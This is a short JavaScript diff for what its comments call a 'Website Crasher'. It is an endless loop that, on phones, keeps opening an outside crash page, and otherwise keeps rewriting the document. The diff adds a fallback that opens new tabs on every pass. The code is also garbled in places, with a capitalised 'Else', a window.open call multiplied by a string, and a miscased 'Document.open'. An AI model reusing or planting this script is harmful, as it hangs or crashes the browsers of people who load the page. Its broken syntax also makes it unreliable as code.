@@ -4,7 +4,6 @@ $vwer = '#';
 
 while(1) {
     
-    
     if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
     /* (Website Crasher For IOS and android And Mostly Every Phone) */
         window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck';
@@ -14,8 +13,13 @@ while(1) {
         // When Function window.open does it's thing, history back will reset the website.
 
     } Else {
+        
         /* (This Will NOT Crash A Computer Or Cause Most Harm) */
         document.open('#' + $x);
+        
+        // if (Document.open()) Fails.
+        let newTab = window.open();
+        newTab.location.href = '#' + $x;
         
     }
 }
